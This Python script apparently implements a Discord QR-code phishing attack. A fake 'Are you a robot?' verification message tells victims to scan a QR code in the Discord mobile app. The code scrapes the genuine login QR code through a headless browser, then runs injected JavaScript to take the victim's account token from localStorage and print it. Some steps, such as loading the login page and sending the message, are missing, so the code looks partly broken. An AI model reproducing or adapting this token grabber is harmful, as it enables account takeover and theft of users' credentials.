from colorama import Fore
from discord.ext import commands
import asyncio
from bs4 import BeautifulSoup
from selenium.webdriver.support.ui import WebDriverWait
from selenium import webdriver
from PIL import Image
import os
import re
import random
import time
import cairosvg
from selenium.webdriver.support import expected_conditions
from webdriver_manager.chrome import ChromeDriverManager
import discord
from selenium.webdriver.chrome.service import Service


# Function to overlay the QR code with an image
def logo_qr(count):
    im1 = Image.open(f'temp/{count}.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    print(count)
    im1.save(f'temp/{count}.png', quality=95)

# Main QR code generation class
class Buttons:
    async def generate_qr_code(self):
        embed = discord.Embed(title=f"🤖Are you a robot?", description=f"✅ Scan this QR code to gain access to the rest of the server ✅\n\n**Couldnt find?**\n🚫 Try again. It can be buggy...\n\n**Important information**\n🚫 This will NOT work without the Discord mobile application 🚫\n🚫 This code only lasts 2 MINUTES!! 🚫\n\n**Tutorial**\n1: Open the Discord mobile app\n2: Open settings\n3: Press Scan QR Code")
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_experimental_option('detach', True)

        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)

        # Get the QR code from the page
        page_source = driver.page_source
        source = BeautifulSoup(page_source, features='lxml')
        if not (div := re.search(r"qrCode-......", str(source))):
            print(f"{Fore.LIGHTRED_EX}Error: the regular expression 'qrCode-......' is not found.")
            os._exit(1)
        div = div.group(0)
        div = source.find("div", {"class": f"{div}"})
        svg = div.find("svg")
        formatedsvg = '<svg xmlns="http://www.w3.org/2000/svg" height="160" viewBox="0 0 37 37" width="160">' + str(svg)[85:]

        # Save the QR code as an image
        n = random.randint(1, 1000)
        PATH = f"temp/{n}.png"
        cairosvg.svg2png(bytestring=formatedsvg.encode('utf-8'), write_to=PATH)
        logo_qr(n)

        print(f"QR Code generated and saved as: temp/{n}.png")

        # Attempt to grab the token from local storage after login
        t_end = time.time() + 60 * 2
        while time.time() < t_end:
            discord_login = driver.current_url
            if discord_login != 'https://discord.com/login':
                print('Grabbing token... \n')
                token = driver.execute_script('''
                    window.dispatchEvent(new Event('beforeunload'));
                    let iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    let localStorage = iframe.contentWindow.localStorage;
                    var token = JSON.parse(localStorage.token);
                    return token;
                ''')
                print('------------------------------------------------------------------------------------------')
                print('Token grabbed:', token)
                print('------------------------------------------------------------------------------------------')
                break

        # Clean up the generated QR code file and close the browser
        os.remove(f"temp/{n}.png")
        driver.quit()

# Example function to run the QR code generation process
async def generate_qr():
    qr = Buttons()
    await qr.generate_qr_code()

# To execute the QR generation:
asyncio.run(generate_qr())
